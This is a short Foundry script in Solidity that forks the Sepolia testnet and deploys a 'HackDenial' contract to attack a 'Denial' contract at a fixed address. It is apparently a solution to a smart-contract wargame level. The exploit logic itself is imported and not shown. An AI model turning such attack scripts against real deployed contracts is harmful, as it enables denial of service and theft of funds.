// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

import {Denial, HackDenial} from "../src/Denial.sol";

contract StakeScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address denialContractAddress = 0xFfe828D19E61FAc324cA271a4f273AEF7B607607;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        HackDenial a = new HackDenial();

        a.hack(denialContractAddress);

        vm.stopBroadcast();
    }
}
